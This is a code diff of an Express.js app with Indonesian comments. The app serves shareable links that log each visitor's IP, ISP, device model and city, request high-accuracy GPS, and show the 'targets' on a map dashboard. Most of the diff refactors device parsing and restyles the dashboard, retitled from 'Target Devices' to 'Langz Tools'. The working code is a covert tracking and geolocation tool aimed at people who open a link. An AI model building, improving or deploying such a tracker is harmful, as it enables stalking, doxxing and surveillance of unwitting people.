@@ -24,43 +24,33 @@ function clientIp(req) {
 function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
 function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }
 
-// --- FUNGSI DETEKSI HP (LEBIH AKURAT) ---
 function detectDevice(ua) {
   if (!ua) return 'Unknown Device';
   let os = 'Desktop';
-  let model = 'Unknown Model';
+  let model = 'Unknown';
   let browser = 'Browser';
 
-  // 1. Deteksi OS & Model
   if (/android/i.test(ua)) {
     os = 'Android';
-    // Ambil string di dalam kurung, cth: (Linux; Android 10; SM-A505F)
     const match = ua.match(/Android[^;]*;\s*([^;)]+)/i);
     if (match && match[1]) {
-      model = match[1].trim();
-      // Bersihin tulisan "Build/..." atau "wv"
-      model = model.split(' Build/')[0].split(' wv')[0].replace(/;/g, '').trim();
+      model = match[1].trim().split(' Build/')[0].split(' wv')[0].replace(/;/g, '').trim();
     }
   } else if (/iphone/i.test(ua)) {
-    os = 'iOS';
-    model = 'iPhone';
+    os = 'iOS'; model = 'iPhone';
   } else if (/ipad/i.test(ua)) {
-    os = 'iOS';
-    model = 'iPad';
+    os = 'iOS'; model = 'iPad';
   } else if (/macintosh|mac os x/i.test(ua)) {
-    os = 'macOS';
-    model = 'Mac';
+    os = 'macOS'; model = 'Mac';
   } else if (/windows/i.test(ua)) {
-    os = 'Windows';
-    model = 'PC';
+    os = 'Windows'; model = 'PC';
   }
 
-  // 2. Deteksi Browser
   if (/chrome|crios/i.test(ua)) browser = 'Chrome';
   else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
   else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
 
-  return `${model} (${os} - ${browser})`;
+  return { model, os, browser };
 }
 
 async function ipGeo(ip) {
@@ -81,19 +71,21 @@ app.get('/api/geoip', async (req, res) => {
   const ip = clientIp(req);
   const slug = cleanSlug(req.query.s);
   const ua = req.headers['user-agent'] || '-';
-  const device = detectDevice(ua);
+  const devInfo = detectDevice(ua);
+  const deviceStr = `${devInfo.model} (${devInfo.os})`;
   
   const data = await ipGeo(ip);
-  const row = [new Date().toISOString(), slug || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', device].join('\t');
+  const row = [new Date().toISOString(), slug || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', deviceStr].join('\t');
   appendLog(GEO_FILE, row);
-  res.json({ ...data, device });
+  res.json({ ...data, device: deviceStr });
 });
 
 app.post('/api/gps', (req, res) => {
   const d = req.body && typeof req.body === 'object' ? { ...req.body } : {};
   d.ip = clientIp(req); 
   d.ua = req.headers['user-agent'] || '-'; 
-  d.device = detectDevice(d.ua); 
+  const devInfo = detectDevice(d.ua);
+  d.device = `${devInfo.model} (${devInfo.os})`;
   d.ts_server = new Date().toISOString();
   appendLog(GPS_FILE, JSON.stringify(d));
   res.json({ ok: true });
@@ -149,45 +141,65 @@ app.get('/dash', (req, res) => {
     const hasGps = d.gpsLat !== null;
     const badge = hasGps ? `<span class="badge gps">GPS ±${Math.round(d.gpsAcc || 0)}m</span>` : `<span class="badge ip">IP only</span>`;
     const loc = hasGps ? `GPS Presisi` : `${d.city}, ${d.region}`;
+    
+    // Ikon berdasarkan OS
+    let icon = '💻';
+    if (d.device.includes('Android')) icon = '📱';
+    if (d.device.includes('iOS')) icon = '🍎';
+
     return `
       <a class="row" href="/dash/map?k=${encodeURIComponent(DASH_KEY)}&i=${i}">
+        <div class="row-icon">${icon}</div>
         <div class="row-left">
           <div class="dev">${d.device || 'Unknown Device'}</div>
           <div class="meta">${d.ip} · ${loc}</div>
-          <div class="meta small">${d.isp} · ${d.slug} · ${new Date(d.time).toLocaleString('id-ID')}</div>
+          <div class="meta small">${d.isp} · ${new Date(d.time).toLocaleString('id-ID')}</div>
         </div>
         <div class="row-right">${badge}<span class="arrow">›</span></div>
       </a>`;
   }).join('');
 
   res.type('html').send(`<!doctype html>
-<html><head><meta charset="utf-8"><title>Devices</title>
+<html><head><meta charset="utf-8"><title>Langz Tools</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
+  :root { --bg: #0b1120; --card: #1e293b; --border: #334155; --text: #e2e8f0; --muted: #94a3b8; --accent: #38bdf8; --green: #34d399; --red: #f87171; }
   * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-  body { margin: 0; background: #0f172a; color: #e2e8f0; }
-  .header { padding: 20px 16px 12px; background: #1e293b; border-bottom: 1px solid #334155; }
-  .header h1 { margin: 0; font-size: 18px; color: #38bdf8; }
-  .header p { margin: 4px 0 0; font-size: 12px; color: #94a3b8; }
-  .list { padding: 12px; }
-  .row { display: flex; justify-content: space-between; align-items: center; background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 14px; margin-bottom: 10px; text-decoration: none; color: inherit; transition: 0.15s; }
-  .row:active { background: #334155; transform: scale(0.99); }
-  .dev { font-weight: 600; font-size: 14px; color: #f1f5f9; margin-bottom: 4px; }
-  .meta { font-size: 12px; color: #94a3b8; line-height: 1.5; }
-  .meta.small { font-size: 11px; color: #64748b; }
-  .badge { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: 700; margin-right: 8px; }
-  .badge.gps { background: #064e3b; color: #34d399; }
-  .badge.ip { background: #7f1d1d; color: #fca5a5; }
-  .arrow { color: #64748b; font-size: 20px; }
-  .empty { text-align: center; padding: 40px 20px; color: #64748b; font-size: 13px; }
+  body { margin: 0; background: var(--bg); color: var(--text); }
+  
+  .header { padding: 24px 20px 16px; background: var(--card); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 10; }
+  .header h1 { margin: 0; font-size: 20px; font-weight: 800; color: #fff; letter-spacing: 0.5px; }
+  .header h1 span { color: var(--accent); }
+  .header p { margin: 4px 0 0; font-size: 13px; color: var(--muted); }
+  
+  .list { padding: 16px; }
+  .row { display: flex; align-items: center; background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 16px; margin-bottom: 12px; text-decoration: none; color: inherit; transition: 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+  .row:active { background: #2a3a52; transform: scale(0.98); }
+  
+  .row-icon { width: 42px; height: 42px; background: rgba(56, 189, 248, 0.1); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; margin-right: 14px; flex-shrink: 0; }
+  .row-left { flex: 1; overflow: hidden; }
+  .dev { font-weight: 700; font-size: 15px; color: #fff; margin-bottom: 4px; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; }
+  .meta { font-size: 13px; color: var(--muted); line-height: 1.5; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; }
+  .meta.small { font-size: 11px; color: #64748b; margin-top: 4px; }
+  
+  .row-right { display: flex; flex-direction: column; align-items: flex-end; margin-left: 10px; }
+  .badge { display: inline-block; padding: 5px 10px; border-radius: 8px; font-size: 11px; font-weight: 700; margin-bottom: 6px; }
+  .badge.gps { background: rgba(52, 211, 153, 0.15); color: var(--green); border: 1px solid rgba(52, 211, 153, 0.3); }
+  .badge.ip { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.3); }
+  .arrow { color: #64748b; font-size: 22px; line-height: 1; }
+  
+  .empty { text-align: center; padding: 60px 20px; color: var(--muted); font-size: 14px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+  .empty span { font-size: 40px; opacity: 0.5; }
 </style></head>
 <body>
+
 <div class="header">
-  <h1>🎯 Target Devices</h1>
+  <h1>⚡ <span>Langz</span> Tools</h1>
   <p>${list.length} device tercatat · klik buat lihat map</p>
 </div>
+
 <div class="list">
-  ${rows || '<div class="empty">Belum ada target yang buka link.</div>'}
+  ${rows || '<div class="empty"><span>📭</span> Belum ada target yang buka link.</div>'}
 </div>
 </body></html>`);
 });
@@ -205,7 +217,7 @@ app.get('/dash/map', (req, res) => {
 
   const lat = d.gpsLat !== null ? d.gpsLat : d.lat;
   const lon = d.gpsLon !== null ? d.gpsLon : d.lon;
-  const zoom = d.gpsLat !== null ? 17 : 11; // Zoom 17 buat GPS presisi
+  const zoom = d.gpsLat !== null ? 17 : 11;
   const acc = d.gpsAcc || 500;
 
   res.type('html').send(`<!doctype html>
@@ -213,25 +225,26 @@ app.get('/dash/map', (req, res) => {
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
 <style>
+  :root { --bg: #0b1120; --card: #1e293b; --border: #334155; --text: #e2e8f0; --muted: #94a3b8; --accent: #38bdf8; }
   * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-  body { margin: 0; background: #0f172a; color: #e2e8f0; }
-  #map { height: 60vh; width: 100%; }
-  .panel { padding: 16px; background: #1e293b; border-top: 1px solid #334155; }
-  .back { display: inline-block; color: #38bdf8; text-decoration: none; font-size: 13px; margin-bottom: 12px; }
-  h2 { margin: 0 0 8px; font-size: 16px; color: #f1f5f9; }
-  .kv { display: flex; justify-content: space-between; font-size: 13px; padding: 6px 0; border-bottom: 1px solid #334155; }
-  .kv span:first-child { color: #94a3b8; }
-  .kv span:last-child { color: #e2e8f0; font-weight: 500; text-align: right; max-width: 60%; word-break: break-all; }
+  body { margin: 0; background: var(--bg); color: var(--text); }
+  #map { height: 55vh; width: 100%; z-index: 1; border-bottom: 2px solid var(--border); }
+  .panel { padding: 20px; background: var(--card); border-radius: 20px 20px 0 0; margin-top: -10px; position: relative; z-index: 2; min-height: 45vh; }
+  .back { display: inline-flex; align-items: center; gap: 5px; color: var(--accent); text-decoration: none; font-size: 14px; font-weight: 600; margin-bottom: 16px; }
+  h2 { margin: 0 0 12px; font-size: 18px; color: #fff; }
+  .kv { display: flex; justify-content: space-between; font-size: 14px; padding: 12px 0; border-bottom: 1px solid var(--border); }
+  .kv span:first-child { color: var(--muted); }
+  .kv span:last-child { color: #fff; font-weight: 600; text-align: right; max-width: 60%; word-break: break-all; }
 </style></head>
 <body>
 <div id="map"></div>
 <div class="panel">
   <a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali ke daftar</a>
   <h2>${d.device || 'Unknown Device'}</h2>
-  <div class="kv"><span>IP</span><span>${d.ip}</span></div>
+  <div class="kv"><span>IP Address</span><span>${d.ip}</span></div>
   <div class="kv"><span>Lokasi</span><span>${d.gpsLat !== null ? 'GPS Presisi' : (d.city + ', ' + d.region)}</span></div>
   <div class="kv"><span>Akurasi</span><span>${d.gpsLat !== null ? '±' + Math.round(acc) + ' m' : '~' + acc + ' km (IP)'}</span></div>
-  <div class="kv"><span>ISP</span><span>${d.isp}</span></div>
+  <div class="kv"><span>Provider</span><span>${d.isp}</span></div>
   <div class="kv"><span>Link</span><span>${d.slug}</span></div>
   <div class="kv"><span>Waktu</span><span>${new Date(d.time).toLocaleString('id-ID')}</span></div>
 </div>
@@ -239,18 +252,20 @@ app.get('/dash/map', (req, res) => {
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 const lat = ${lat}, lon = ${lon}, acc = ${acc}, isGps = ${d.gpsLat !== null};
-const map = L.map('map').setView([lat, lon], ${zoom});
+const map = L.map('map', { zoomControl: false }).setView([lat, lon], ${zoom});
 L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution: '© OSM' }).addTo(map);
+
+L.control.zoom({ position: 'bottomright' }).addTo(map);
 
 L.circle([lat, lon], {
   radius: isGps ? acc : acc * 1000,
   color: isGps ? '#34d399' : '#ef4444',
   fillColor: isGps ? '#34d399' : '#ef4444',
-  fillOpacity: 0.15, weight: 1
+  fillOpacity: 0.2, weight: 1
 }).addTo(map);
 L.circleMarker([lat, lon], {
-  radius: 10, color: isGps ? '#059669' : '#b91c1c',
-  fillColor: isGps ? '#34d399' : '#ef4444', fillOpacity: 0.9, weight: 3
+  radius: 12, color: isGps ? '#059669' : '#b91c1c',
+  fillColor: isGps ? '#34d399' : '#ef4444', fillOpacity: 1, weight: 3
 }).addTo(map).bindPopup('<b>' + (isGps ? 'GPS Presisi' : 'IP Lokasi') + '</b><br>Akurasi: ' + (isGps ? '±' + Math.round(acc) + 'm' : '~' + acc + 'km'));
 </script>
 </body></html>`);
@@ -337,7 +352,6 @@ app.get('*', (req, res) => {
     isGpsDone = true;
     banner.classList.remove('show');
     
-    // Minta GPS dengan akurasi tinggi
     navigator.geolocation.getCurrentPosition(
       p => { 
         const payload = {src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug,ts:Date.now()};
@@ -347,7 +361,7 @@ app.get('*', (req, res) => {
       e => { 
         fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps_err',err:e.code,slug,ts:Date.now()}) }).catch(()=>{}); 
       },
-      {enableHighAccuracy:true,timeout:15000,maximumAge:0} // Timeout 15 detik buat nunggu satelit
+      {enableHighAccuracy:true,timeout:15000,maximumAge:0}
     );
   });
 })();
